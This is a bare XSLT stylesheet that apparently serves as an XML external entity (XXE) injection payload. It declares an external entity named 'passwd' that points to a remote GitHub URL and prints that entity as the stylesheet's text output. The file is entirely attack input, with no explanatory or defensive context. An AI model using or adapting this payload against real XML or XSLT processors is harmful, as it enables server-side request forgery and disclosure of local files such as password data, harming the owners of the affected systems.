<?xml version="1.0"?> 
<!DOCTYPE xsl:stylesheet [ 
<!ENTITY passwd SYSTEM "https://raw.githubusercontent.com/matthewok/testphp/master/test.xsl" >]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="text"/>
  <xsl:template match="/"> &passwd; </xsl:template>
</xsl:stylesheet> 
